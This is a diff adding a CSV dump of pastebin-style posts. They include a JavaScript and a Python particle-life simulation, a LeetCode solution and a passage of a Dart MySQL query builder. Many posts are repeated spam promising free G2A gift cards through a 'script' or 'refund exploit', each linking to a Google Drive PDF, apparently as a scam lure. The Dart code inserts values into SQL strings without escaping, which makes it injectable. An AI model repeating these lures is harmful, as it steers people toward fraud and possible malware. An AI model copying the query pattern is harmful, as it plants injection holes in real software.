@@ -1,0 +1,3834 @@
+id,title,username,language,date,content
+JLF0hLNJ,🤑G2A.com Free Gift Card FIX June 2024🤑,Axel_Jax,JavaScript,Monday 24th of June 2024 01:02:11 PM CDT,"G2A.com complimentary voucher & gaming guide.
+Any voucher for free on G2A.com including Amazon gift cards & anything else offered.
+This is the most current version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24th 2024
+
+"
+gj8CE2ZR,particle_life.html,here2share,JavaScript,Monday 24th of June 2024 12:56:37 PM CDT,"<html>
+<title>Life</title>
+
+<head>
+
+    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
+
+    <style>
+        :root {
+            color-scheme: dark;
+            --canvas-bg-color: rgba(0, 0, 0, 0); /* transparent */
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #canvas {
+            border: #504e52;
+            border-style: dashed;
+            border-width: 5;
+            outline: none;  /* because of the 'tabindex' focus trick */
+            background-color: var(--canvas-bg-color);
+        }
+    </style>
+</head>
+
+<body>
+    <!-- 'tabindex' is a trick to make the canvas capture key events -->
+    <canvas id=""canvas"" tabindex=""1""></canvas>
+
+    <script src=""https://cdn.jsdelivr.net/npm/lil-gui@0.17""></script>
+
+    <script>
+        const maxRadius = 200;
+        const maxClusters = 20;
+        const minClusterSize = 50;
+        const predefinedColors = ['green', 'red', 'orange', 'cyan', 'magenta', 'lavender', 'teal'];
+        const settings = {
+            seed: 91651088029,
+            fps: 0,
+            atoms: {
+                count: 500,  // Per Color
+                radius: 1,
+            },
+            drawings: {  // Drawing options can be expensive on performance
+                lines: false,   // draw lines between atoms that arr effecting each other
+                circle: false,  // draw atoms as circles
+                clusters: false,
+                background_color: '#000000', // Background color
+            },
+            export: {
+                // Export a Screenshot image
+                image: () => {
+                    const imageDataURL = canvas.toDataURL({
+                        format: 'png',
+                        quality: 1
+                    });
+                    dataURL_downloader(imageDataURL);
+                },
+                // Export a video recording
+                video: () => {
+                    mediaRecorder.state == 'recording' ? mediaRecorder.stop() : mediaRecorder.start();
+                },
+            },
+            explore: false,
+            explorePeriod: 100,
+            rules: {},
+            rulesArray: [],
+            radii: {},
+            radii2Array: [],
+            colors: [],
+            numColors: 4,
+            time_scale: 1.0,
+            viscosity: 0.7,  // speed-dampening (can be >1 !)
+            gravity: 0.0,  // pulling downward
+            pulseDuration: 10,
+            wallRepel: 40,
+            reset: () => {
+                randomAtoms(settings.atoms.count, true)
+            },
+            randomRules: () => {
+                settings.seed = local_seed   // last used seed is the new starting seed
+                startRandom()
+            },
+            symmetricRules: () => {
+                symmetricRules()
+                randomAtoms(settings.atoms.count, true)
+                updateGUIDisplay()
+            },
+            gui: null,
+        }
+
+        const setupClicks = () => {
+            canvas.addEventListener('click',
+                (e) => {
+                    pulse = settings.pulseDuration;
+                    if (e.shiftKey) pulse = -pulse;
+                    pulse_x = e.clientX;
+                    pulse_y = e.clientY;
+                }
+            )
+        }
+        const setupKeys = () => {
+            canvas.addEventListener('keydown',
+                function (e) {
+                    console.log(e.key)
+                    switch (e.key) {
+                        case 'r':
+                          settings.randomRules()
+                        break;
+                        case 't':
+                          settings.drawings.clusters = !settings.drawings.clusters
+                        break;
+                        case 'o':
+                          settings.reset()
+                        break;
+                        case 's':
+                          settings.symmetricRules()
+                        break;
+                        default:
+                          console.log(e.key)
+                    }
+                })
+        }
+        const updateGUIDisplay = () => {
+            console.log('gui', settings.gui)
+            settings.gui.destroy()
+            setupGUI()
+        }
+        Object.defineProperty(String.prototype, 'capitalise', {
+            value: function() {
+                return this.charAt(0).toUpperCase() + this.slice(1);
+            },
+            enumerable: false
+        })
+
+        // Build GUI
+        const setupGUI = () => {
+            settings.gui = new lil.GUI()
+            // Configs
+            const configFolder = settings.gui.addFolder('Config')
+            configFolder.add(settings, 'reset').name('Reset')
+            configFolder.add(settings, 'randomRules').name('Random Rules')
+            configFolder.add(settings, 'symmetricRules').name('Symmetric Rules')
+            configFolder.add(settings, 'numColors', 1, 7, 1).name('Number of Colors')
+                .listen().onFinishChange(v => {
+                    setNumberOfColors();
+                    startRandom();
+                })
+            configFolder.add(settings, 'seed').name('Seed').listen().onFinishChange(v => {
+                startRandom();
+            })
+            configFolder.add(settings, 'fps').name('FPS - (Live)').listen().disable()
+            configFolder.add(settings.atoms, 'count', 1, 1000, 1).name('Atoms per-color').listen().onFinishChange(v => {
+                randomAtoms(v, true)
+            })
+            configFolder.add(settings, 'time_scale', 0.1, 5, 0.01).name('Time Scale').listen()
+            configFolder.add(settings, 'viscosity', 0.1, 2, 0.1).name('Viscosity').listen()
+
+            configFolder.add(settings, 'gravity', 0., 1., 0.05).name('Gravity').listen()
+            configFolder.add(settings, 'pulseDuration', 1, 100, 1).name('Click Pulse Duration').listen()
+
+            configFolder.add(settings, 'wallRepel', 0, 100, 1).name('Wall Repel').listen()
+            configFolder.add(settings, 'explore').name('Random Exploration').listen()
+            // Drawings
+            const drawingsFolder = settings.gui.addFolder('Drawings')
+            drawingsFolder.add(settings.atoms, 'radius', 1, 10, 0.5).name('Radius').listen()
+            drawingsFolder.add(settings.drawings, 'circle').name('Circle Shape').listen()
+            drawingsFolder.add(settings.drawings, 'clusters').name('Track Clusters').listen()
+            drawingsFolder.add(settings.drawings, 'lines').name('Draw Lines').listen()
+            drawingsFolder.addColor(settings.drawings, 'background_color').name('Background Color').listen()
+            // Export
+            const exportFolder = settings.gui.addFolder('Export')
+            exportFolder.add(settings.export, 'image').name('Image')
+            exportFolder.add(settings.export, 'video').name('Video: Start / stop')
+            // Colors
+            for (const atomColor of settings.colors) {
+                const colorFolder =
+                    settings.gui.addFolder(`Rules: <font color=\'${atomColor}\'>${atomColor.capitalise()}</font>`)
+                for (const ruleColor of settings.colors) {
+                    colorFolder.add(settings.rules[atomColor], ruleColor, -1, 1, 0.001)
+                         .name(`<-> <font color=\'${ruleColor}\'>${ruleColor.capitalise()}</font>`)
+                         .listen().onFinishChange(v => { flattenRules() }
+                    )
+                }
+                colorFolder.add(settings.radii, atomColor, 1, maxRadius, 5).name('Radius')
+                    .listen().onFinishChange(v => { flattenRules() }
+                )
+            }
+
+
+        }
+
+
+        // Seedable 'decent' random generator
+        var local_seed = settings.seed;
+        function mulberry32() {
+            let t = local_seed += 0x6D2B79F5;
+            t = Math.imul(t ^ t >>> 15, t | 1);
+            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
+            return ((t ^ t >>> 14) >>> 0) / 4294967296.;
+        }
+
+        function loadSeedFromUrl() {
+            let hash = window.location.hash;
+            if (hash != undefined && hash[0] == '#') {
+                let param = Number(hash.substr(1)); // remove the leading '#'
+                if (isFinite(param)) {
+                    settings.seed = param;
+                    console.log(""Using seed "" + settings.seed);
+                }
+            }
+        }
+
+        function randomRules() {
+            if (!isFinite(settings.seed)) settings.seed = 0xcafecafe;
+            window.location.hash = ""#"" + settings.seed;
+            document.title = ""Life #"" + settings.seed;
+            local_seed = settings.seed;
+            console.log(""Seed="" + local_seed);
+            for (const i of settings.colors) {
+                settings.rules[i] = {};
+                for (const j of settings.colors) {
+                    settings.rules[i][j] = mulberry32() * 2 - 1;
+                }
+                settings.radii[i] = 80;
+            }
+            console.log(JSON.stringify(settings.rules));
+            flattenRules()
+        }
+
+        function symmetricRules() {
+            for (const i of settings.colors) {
+                for (const j of settings.colors) {
+                    if (j < i) {
+                        let v = 0.5 * (settings.rules[i][j] + settings.rules[j][i]);
+                        settings.rules[i][j] = settings.rules[j][i] = v;
+                    }
+                }
+            }
+            console.log(JSON.stringify(settings.rules));
+            flattenRules()
+        }
+
+        function flattenRules() {
+            settings.rulesArray = []
+            settings.radii2Array = []
+            for (const c1 of settings.colors) {
+                for (const c2 of settings.colors) {
+                    settings.rulesArray.push(settings.rules[c1][c2])
+                }
+                settings.radii2Array.push(settings.radii[c1] * settings.radii[c1])
+            }
+        }
+
+        function updateCanvasDimensions() {
+            canvas.width = window.innerWidth * 0.9;
+            canvas.height = window.innerHeight * 0.9;
+        }
+
+        // Initiate Random locations for Atoms ( used when atoms created )
+        function randomX() {
+            return mulberry32() * (canvas.width - 100) + 50;
+        };
+
+        function randomY() {
+            return mulberry32() * (canvas.height - 100) + 50;
+        };
+
+        /* Create an Atom - Use matrices for x4/5 performance improvement
+        atom[0] = x
+        atom[1] = y
+        atom[2] = ax
+        atom[3] = ay
+        atom[4] = color (index)
+        */
+        const create = (number, color) => {
+            for (let i = 0; i < number; i++) {
+                atoms.push([randomX(), randomY(), 0, 0, color])
+            }
+        };
+
+        function randomAtoms(number_of_atoms_per_color, clear_previous) {
+            if (clear_previous) atoms.length = 0;
+            for (let c = 0; c < settings.colors.length; c++) {
+                create(number_of_atoms_per_color, c)
+            }
+            clusters.length = 0;
+        }
+
+        function startRandom() {
+            randomRules();
+            randomAtoms(settings.atoms.count, true);
+            updateGUIDisplay()
+        }
+
+        function setNumberOfColors() {
+            settings.colors = [];
+            for (let i = 0; i < settings.numColors; ++i) {
+                settings.colors.push(predefinedColors[i]);
+            }
+        }
+
+        // Run Application
+        loadSeedFromUrl()
+
+        // Canvas
+        const canvas = document.getElementById('canvas');
+        const m = canvas.getContext(""2d"");
+        // Draw a square
+        const drawSquare = (x, y, color, radius) => {
+            m.fillStyle = color;
+            m.fillRect(x - radius, y - radius, 2 * radius, 2 * radius);
+        }
+
+        // Draw a circle
+        function drawCircle(x, y, color, radius, fill = true) {
+            m.beginPath();
+            m.arc(x, y, radius, 0 * Math.PI, 2 * Math.PI);  // x, y, radius, ArcStart, ArcEnd
+            m.closePath();
+            m.strokeStyle = m.fillStyle = color;
+            fill ? m.fill() : m.stroke()
+        };
+
+        // Draw a line between two atoms
+        function drawLineBetweenAtoms(ax, ay, bx, by, color) {
+            m.beginPath();
+            m.moveTo(ax, ay);
+            m.lineTo(bx, by);
+            m.closePath();
+            m.strokeStyle = color;
+            m.stroke();
+        };
+
+        // [position-x, position-y, radius, color]
+        //    /* tmp accumulators: */
+        //  {count, accum-x, accum-y, accum-d^2, accum-color}]
+        let clusters = [];
+        function newCluster() {
+            return [randomX(), randomY(), maxRadius, 'white'];
+        }
+        function addNewClusters(num_clusters) {
+            if (clusters.length < num_clusters / 2) {
+                while (clusters.length < num_clusters) clusters.push(newCluster());
+            }
+        }
+        function findNearestCluster(x, y) {
+            let best = -1;
+            let best_d2 = 1.e38;
+            for (let i = 0; i < clusters.length; ++i) {
+                const c = clusters[i];
+                const dx = c[0] - x;
+                const dy = c[1] - y;
+                const d2 = dx * dx + dy * dy;
+                if (d2 < best_d2) {
+                    best = i;
+                    best_d2 = d2;
+                }
+            }
+            return [best, best_d2];
+        }
+        function moveClusters(accums) {
+            let max_d = 0.;   // record max cluster displacement
+            for (let i = 0; i < clusters.length; ++i) {
+                let c = clusters[i];
+                const a = accums[i];
+                if (a[0] > minClusterSize) {
+                    const norm = 1. / a[0];
+                    const new_x = a[1] * norm;
+                    const new_y = a[2] * norm;
+                    max_d = Math.max(max_d, Math.abs(c[0] - new_x), Math.abs(c[1 ] - new_y));
+                    c[0] = new_x;
+                    c[1] = new_y;
+                }
+            }
+            return max_d;
+        }
+        function finalizeClusters(accums) {
+            for (let i = 0; i < clusters.length; ++i) {
+                let c = clusters[i];
+                const a = accums[i];
+                if (a[0] > minClusterSize) {
+                    const norm = 1. / a[0];
+                    const new_r = 1.10 * Math.sqrt(a[3] * norm);  // with 10% extra room
+                    c[2] = 0.95 * c[2] + 0.05 * new_r;  // exponential smoothing
+                    // 'average' color
+                    c[3] = settings.colors[Math.floor(a[4] * norm + .5)];
+                } else {
+                    c[2] = 0.;   // disable the weak cluster
+                }
+            }
+            // note: if half of the particles are not within the average
+            // radius of the cluster, we should probably split it in two
+            // along the main axis!
+        }
+        function trackClusters() {
+            addNewClusters(maxClusters);
+            let accums = [];
+            for (const c of clusters) accums.push([0, 0., 0., 0., 0]);
+            const maxKMeanPasses = 10;
+            for (let pass = maxKMeanPasses; pass >= 0; --pass) {
+                for (let a of accums) a = [0, 0., 0., 0., 0];
+                for (const c of atoms) {
+                    const [best, best_d2] = findNearestCluster(c[0], c[1]);
+                    if (best >= 0 && best_d2 < maxRadius * maxRadius) {
+                        accums[best][0] += 1;
+                        accums[best][1] += c[0];
+                        accums[best][2] += c[1];
+                        accums[best][3] += best_d2;
+                        accums[best][4] += c[4];
+                    }
+                }
+                const max_d = moveClusters(accums);
+                if (max_d < 1.) break;
+            }
+            finalizeClusters(accums);
+        }
+        function drawClusters() {
+            let i = 0;
+            while (i < clusters.length) {
+                let c = clusters[i];
+                if (c[2] > 0.) {
+                    drawCircle(c[0], c[1], c[3], c[2], false);
+                    ++i;
+                } else {
+                    // remove cluster by swapping with last
+                    const last = clusters.pop();
+                    if (i < clusters.length) clusters[i] = last;
+                }
+            }
+        }
+
+        // Canvas Dimensions
+        updateCanvasDimensions()
+
+
+        // Params for click-based pulse event
+        var pulse = 0;
+        var pulse_x = 0,
+            pulse_y = 0;
+
+        var exploration_timer = 0;
+        function exploreParameters() {
+            if (exploration_timer <= 0) {
+                let c1 = settings.colors[Math.floor(mulberry32() * settings.numColors)];
+                if (mulberry32() >= 0.2) {  // 80% of the time, we change the strength
+                  let c2 = settings.colors[Math.floor(mulberry32() * settings.numColors)];
+                  let new_strength = mulberry32();
+                  // for better results, we force opposite-signed values
+                  if (settings.rules[c1][c2] > 0) new_strength = -new_strength;
+                  settings.rules[c1][c2] = new_strength;
+                } else {  // ...otherwise, the radius
+                  settings.radii[c1] = 1 + Math.floor(mulberry32() * maxRadius);
+                }
+                flattenRules();
+                exploration_timer = settings.explorePeriod;
+            }
+            exploration_timer -= 1;
+        }
+
+        var total_v; // global velocity as a estimate of on-screen activity
+
+        // Apply Rules ( How atoms interact with each other )
+        const applyRules = () => {
+            total_v = 0.;
+            // update velocity first
+            for (const a of atoms) {
+                let fx = 0;
+                let fy = 0;
+                const idx = a[4] * settings.numColors;
+                const r2 = settings.radii2Array[a[4]]
+                for (const b of atoms) {
+                    const g = settings.rulesArray[idx + b[4]];
+                    const dx = a[0] - b[0];
+                    const dy = a[1] - b[1];
+                    if (dx !== 0 || dy !== 0) {
+                        const d = dx * dx + dy * dy;
+                        if (d < r2) {
+                            const F = g / Math.sqrt(d);
+                            fx += F * dx;
+                            fy += F * dy;
+
+                            // Draw lines between atoms that are effecting each other.
+                            if (settings.drawings.lines) {
+                                drawLineBetweenAtoms(a[0], a[1], b[0], b[1], settings.colors[b[4]]);
+                            }
+                        }
+                    }
+                }
+                if (pulse != 0) {
+                    const dx = a[0] - pulse_x;
+                    const dy = a[1] - pulse_y;
+                    const d = dx * dx + dy * dy;
+                    if (d > 0) {
+                        const F = 100. * pulse / (d * settings.time_scale);
+                        fx += F * dx;
+                        fy += F * dy;
+                    }
+                }
+                if (settings.wallRepel > 0) {
+                  const d = settings.wallRepel
+                  const strength = 0.1
+                  if (a[0] <                d) fx += (d -                a[0]) * strength
+                  if (a[0] > canvas.width - d) fx += (canvas.width - d - a[0]) * strength
+                  if (a[1] <                 d) fy += (d                 - a[1]) * strength
+                  if (a[1] > canvas.height - d) fy += (canvas.height - d - a[1]) * strength
+                }
+                fy += settings.gravity;
+                const vmix = (1. - settings.viscosity);
+                a[2] = a[2] * vmix + fx * settings.time_scale;
+                a[3] = a[3] * vmix + fy * settings.time_scale;
+                // record typical activity, so that we can scale the
+                // time_scale later accordingly
+                total_v += Math.abs(a[2]);
+                total_v += Math.abs(a[3]);
+            }
+            // update positions now
+            for (const a of atoms) {
+                a[0] += a[2]
+                a[1] += a[3]
+
+                // When Atoms touch or bypass canvas borders
+                if (a[0] < 0) {
+                    a[0] = -a[0];
+                    a[2] *= -1;
+                }
+                if (a[0] >= canvas.width) {
+                    a[0] = 2 * canvas.width - a[0];
+                    a[2] *= -1;
+                }
+                if (a[1] < 0) {
+                    a[1] = -a[1];
+                    a[3] *= -1;
+                }
+                if (a[1] >= canvas.height) {
+                    a[1] = 2 * canvas.height - a[1];
+                    a[3] *= -1;
+                }
+
+            }
+            total_v /= atoms.length;
+        };
+
+
+        // Generate Rules
+        setNumberOfColors()
+        randomRules()
+
+        // Generate Atoms
+        const atoms = []
+        randomAtoms(settings.atoms.count, true)
+
+
+        setupClicks()
+        setupKeys()
+        setupGUI()
+
+        console.log('settings', settings)
+
+        // Update Frames
+        var lastT = Date.now();
+        update();
+
+        function update() {
+            // Update Canvas Dimensions - if screen size changed
+            updateCanvasDimensions()
+            // Background color
+            m.fillStyle = settings.drawings.background_color;
+            m.fillRect(0, 0, canvas.width, canvas.height);
+            // Appy Rules
+            applyRules();
+            // Draw Atoms
+            for (const a of atoms) {
+                if (settings.drawings.circle) {
+                    drawCircle(a[0], a[1], settings.colors[a[4]], settings.atoms.radius);
+                } else {
+                    drawSquare(a[0], a[1], settings.colors[a[4]], settings.atoms.radius);
+                }
+            }
+            if (settings.drawings.clusters) {
+                trackClusters();
+                drawClusters();
+            }
+
+            updateParams();
+
+            // const inRange = (a) => 0 <= a[0] && a[0] < canvas.width && 0 <= a[1] && a[1] < canvas.height
+            // console.log('inRange', atoms.filter(inRange).length)
+
+            requestAnimationFrame(update);
+        };
+
+        // post-frame stats and updates
+        function updateParams() {
+            // record FPS
+            var curT = Date.now();
+            if (curT > lastT) {
+                const new_fps = 1000. / (curT - lastT);
+                settings.fps = Math.round(settings.fps * 0.8 + new_fps * 0.2)
+                lastT = curT;
+            }
+
+            // adapt time_scale based on activity
+            if (total_v > 30. && settings.time_scale > 5.) settings.time_scale /= 1.1;
+            if (settings.time_scale < 0.9) settings.time_scale *= 1.01;
+            if (settings.time_scale > 1.1) settings.time_scale /= 1.01;
+
+            if (pulse != 0) pulse -= (pulse > 0) ? 1 : -1;
+            if (settings.explore) exploreParameters();
+        }
+
+
+        
+        // Download DataURL
+        function dataURL_downloader(dataURL, name = `particle_life_${settings.seed}`) {
+            const hyperlink = document.createElement(""a"");
+            // document.body.appendChild(hyperlink);
+            hyperlink.download = name;
+            hyperlink.target = '_blank';
+            hyperlink.href = dataURL;
+            hyperlink.click();
+            hyperlink.remove();
+        };
+
+
+        // Recorde a video ----------------------------------
+        // Stream
+        const videoStream = canvas.captureStream();
+        // Video Recorder
+        const mediaRecorder = new MediaRecorder(videoStream);
+        // temp chunks
+        let chunks = [];
+        // Store chanks
+        mediaRecorder.ondataavailable = function (e) {
+            chunks.push(e.data);
+        };
+        // Download video after recording is stopped
+        mediaRecorder.onstop = function (e) {
+            // Chunks ---> Blob
+            const blob = new Blob(chunks, { 'type': 'video/mp4' });
+            // Blob -----> DataURL
+            const videoDataURL = URL.createObjectURL(blob);
+
+            // Download video
+            dataURL_downloader(videoDataURL);
+
+            // Reset Chunks
+            chunks = [];
+        };
+        
+        // mediaRecorder.start(); // Start recording
+        // mediaRecorder.stop(); // Stop recording
+        // --------------------------------------------------
+    </script>
+
+</body>
+
+</html>"
+0neATiF3,🤑G2A.com Free Gift Card FIX June 2024🎁,FunkyMonkey22,JavaScript,Monday 24th of June 2024 12:56:08 PM CDT,"G2A.com free gift card & gaming guide.
+Any gift card for free on G2A.com including Playstation gift cards & all else offered.
+This is the most latest version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+24th of June 2024
+
+"
+6FbaDbyq,🤑G2A.com Free Gift Card FIX June 2024🤑,Darkew,JavaScript,Monday 24th of June 2024 12:50:04 PM CDT,"G2A.com free gift card & games guide.
+Any item for free on G2A.com including Amazon gift cards & everything else offered.
+This is the most latest version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+24th of June 2024
+
+"
+Bn11JdcD,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 🎁,jusst2k4,GetText,Monday 24th of June 2024 12:45:38 PM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+ 
+This is the most up to date version of this script. Any other one posted will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_325380.pdf
+ 
+Working as of:
+24 June 2024"
+APcUb8Rc,🤑G2A.com Free Gift Card FIX June 2024🎁,angeloee,JavaScript,Monday 24th of June 2024 12:43:53 PM CDT,"G2A.com free voucher & gaming guide.
+Any item for free on G2A.com including Xbox gift cards & everything else offered.
+This is the most up to date version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24th 2024
+
+"
+CbM8eedN,🤑G2A.com Free Gift Card FIX June 2024🎁,jcxeq,JavaScript,Monday 24th of June 2024 12:37:11 PM CDT,"G2A.com free gift card & games guide.
+Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
+This is the most current version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24 2024
+
+"
+U7vdiDNe,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 🎁,wwxcwx,GetText,Monday 24th of June 2024 12:36:00 PM CDT,"G2A.com free gift card & games updated guide.
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered
+
+This is the most up to date version of this script. Any other one posted will not work!
+ 
+PDF guide here:
+https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
+
+Working as of:
+24 June 2024"
+kH20JzHp,Algoverse_adesh_26,kucheasysa,Python,Monday 24th of June 2024 12:35:27 PM CDT,"class Solution:
+    def isToeplitzMatrix(self, matrix: List[List[int]]) -> bool:
+        for i in range(len(matrix) - 1):
+            for j in range(len(matrix[i]) - 1):
+                if matrix[i][j] != matrix[i+1][j+1]:
+                    return False
+        return True"
+ty6yy5NE,🤑G2A.com Free Gift Card FIX June 2024🤑,PAUL-A8,JavaScript,Monday 24th of June 2024 12:31:08 PM CDT,"G2A.com free voucher & gaming guide.
+Any voucher for free on G2A.com including Steam gift cards & all else offered.
+This is the most current version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24 2024
+
+"
+jNZvUAmM,🤑G2A.com Free Gift Card FIX June 2024🤑,Kevin_Chen1,JavaScript,Monday 24th of June 2024 12:25:05 PM CDT,"G2A.com free voucher & gaming guide.
+Any gift card for free on G2A.com including Steam gift cards & everything else offered.
+This is the most latest version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24 2024
+
+"
+0BGQc8Pk,# tk_particle_life.py,here2share,Python,Monday 24th of June 2024 12:21:27 PM CDT,"# tk_particle_life.py
+
+import tkinter as tk
+from PIL import Image, ImageTk, ImageDraw
+import random
+import math
+import time
+
+atoms = []
+window_size = 600
+g = 0.1
+cell_size = 20
+cells = {}
+
+def atom(x, y, c):
+    return {""x"": x, ""y"": y, ""vx"": 0, ""vy"": 0, ""color"": c}
+
+def randomxy():
+    return round(random.random() * window_size + 1)
+
+def cxy(a):
+    return int(a[""x""] // cell_size), int(a[""y""] // cell_size)
+
+def create(number, color):
+    group = []
+    for i in range(number):
+        a = atom(randomxy(), randomxy(), color)
+        cx, cy = cxy(a)
+        key = (cx, cy)
+        group.append(a)
+        atoms.append(a)
+        add_to_cell(a, cx, cy, key)
+    return group
+
+def add_to_cell(a, cx, cy, key):
+    if key not in cells:
+        cells[key] = []
+    cells[key].append(a)
+
+def remove_from_cell(a, cx, cy, key):
+    if key in cells and a in cells[key]:
+        cells[key].remove(a)
+
+def update_cells():
+    for a in atoms:
+        cx, cy = cxy(a)
+        key = (cx, cy)
+        remove_from_cell(a, cx, cy, key)
+        add_to_cell(a, cx, cy, key)
+
+def rule(atoms1, atoms2, g):
+    for i in range(len(atoms1)):
+        fx = 0
+        fy = 0
+        a = atoms1[i]
+        cx, cy = cxy(a)
+        for dx in range(-1, 2):
+            for dy in range(-1, 2):
+                nx, ny = cx + dx, cy + dy
+                key = (nx % (window_size // cell_size), ny % (window_size // cell_size))
+                if key in cells:
+                    for b in cells[key]:
+                        dx = a[""x""] - b[""x""]
+                        dy = a[""y""] - b[""y""]
+                        dx = dx - round(dx / window_size) * window_size
+                        dy = dy - round(dy / window_size) * window_size
+                        d = (dx * dx + dy * dy) ** 0.5
+                        if d > 0 and d < 100:
+                            F = (g + g) / d
+                            fx += F * dx
+                            fy += F * dy
+        a[""vx""] = (a[""vx""] + fx) * 0.5
+        a[""vy""] = (a[""vy""] + fy) * 0.5
+        a[""x""] = (a[""x""] + a[""vx""] * 0.07) % window_size
+        a[""y""] = (a[""y""] + a[""vy""] * 0.07) % window_size
+
+def draw_atom(x, y, color):
+    draw.line([x, y, x - 1, y + 1], fill=color, width=3)
+
+def set_gravity():
+    for i in range(6):
+        gravity[i] = gravity[i, 'f'] * random.uniform(1, 2.999) 
+        print(round(gravity[i], 4), end=', ')
+    print('\n')
+
+gravity = {}
+t = 0.6, -1.5, 0.9, -1.4, 1.0, -3.2
+for i in range(6):
+    gravity[i, 'f'] = t[i]
+set_gravity()
+green = create(123, ""green"")
+yellow = create(99, ""yellow"")
+red = create(79, ""red"")
+
+root = tk.Tk()
+root.title(""tk_particle_life.py"")
+root.geometry(f""{window_size}x{window_size}+10+10"")
+label = tk.Label(root)
+label.pack()
+
+delay = 10
+t = time.time() + delay
+while True:
+    rule(red, red, gravity[0])
+    rule(red, yellow, gravity[1])
+    rule(yellow, yellow, gravity[2])
+    rule(green, green, gravity[3])
+    rule(green, red, gravity[4])
+    rule(green, yellow, gravity[5])
+        
+    update_cells()
+    img = Image.new(""RGB"", (window_size + 10, window_size + 10), ""black"")
+    draw = ImageDraw.Draw(img)
+    for i in range(len(atoms)):
+        draw_atom(atoms[i][""x""], atoms[i][""y""], atoms[i][""color""])
+    img_tk = ImageTk.PhotoImage(img)
+    label.config(image=img_tk)
+    if time.time() > t:
+        t = time.time() + delay
+        set_gravity()
+    root.update()
+"
+VBjJHcED,🤑G2A.com Free Gift Card FIX June 2024🎁,mano03,JavaScript,Monday 24th of June 2024 12:19:02 PM CDT,"G2A.com free gift card & games guide.
+Any item for free on G2A.com including Amazon gift cards & everything else offered.
+This is the most latest version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24 2024
+
+"
+111viTft,🤑G2A.com Free Gift Card FIX June 2024🎁,gigi1964,JavaScript,Monday 24th of June 2024 12:12:58 PM CDT,"G2A.com complimentary voucher & games guide.
+Any item for free on G2A.com including Xbox gift cards & anything else offered.
+This is the most current version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+June 24th 2024
+
+"
+SiRuzicR,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 🎁,ssss50ws,GetText,Monday 24th of June 2024 12:08:05 PM CDT,"G2A.com free gift card & games updated guide
+Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
+
+This is the most up to date version of this script. Any other one posted will not work
+ 
+PDF guide here:
+https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
+
+Working as of:
+24 June 2024"
+8umZCGBe,🤑G2A.com Free Gift Card FIX June 2024🤑,TeleBot,JavaScript,Monday 24th of June 2024 12:06:56 PM CDT,"G2A.com free gift card & gaming guide.
+Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
+This is the most current version of this script.
+
+PDF guide here:
+https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872
+
+Working as of:
+24th of June 2024
+
+"
+yh3JQd4u,MySqlCommand For dart,Genral,Dart,Monday 24th of June 2024 12:01:05 PM CDT,"import 'package:mysql1/mysql1.dart';
+import 'dart:async';
+
+enum MySqlCommandType { delete, insert, select, update, count }
+
+class MySqlCommand {
+  MySqlCommandType type;
+  StringBuffer _command = StringBuffer();
+  List<MySqlParameter> _parameters = [];
+  bool firstPart = true;
+  Map<int, String> insertFields = {};
+  Map<int, String> insertValues = {};
+  int lastpair = 0;
+
+  MySqlCommand(this.type) {
+    switch (type) {
+      case MySqlCommandType.select:
+        _command.write('SELECT * FROM <R>');
+        break;
+      case MySqlCommandType.update:
+        _command.write('UPDATE <R> SET ');
+        break;
+      case MySqlCommandType.insert:
+        _command.write('INSERT INTO <R> (<F>) VALUES (<V>)');
+        break;
+      case MySqlCommandType.delete:
+        _command.write('DELETE FROM <R> WHERE <C> = <V>');
+        break;
+      case MySqlCommandType.count:
+        _command.write('SELECT count(<V>) FROM <R>');
+        break;
+    }
+  }
+
+  bool _comma() {
+    if (firstPart) {
+      firstPart = false;
+      return false;
+    }
+    return _command.toString().endsWith(',');
+  }
+
+  MySqlCommand select(String table) {
+    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`'));
+    return this;
+  }
+
+  MySqlCommand delete(String table, String column, Object value) {
+    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`')
+        .replaceAll('<C>', '`$column`')
+        .replaceAll('<V>', value is String ? ""'$value'"" : value.toString()));
+    return this;
+  }
+
+  MySqlCommand update(String table) {
+    _command = StringBuffer(_command.toString().replaceAll('<R>', '`$table`'));
+    return this;
+  }
+
+  MySqlCommand set(String column, Object value) {
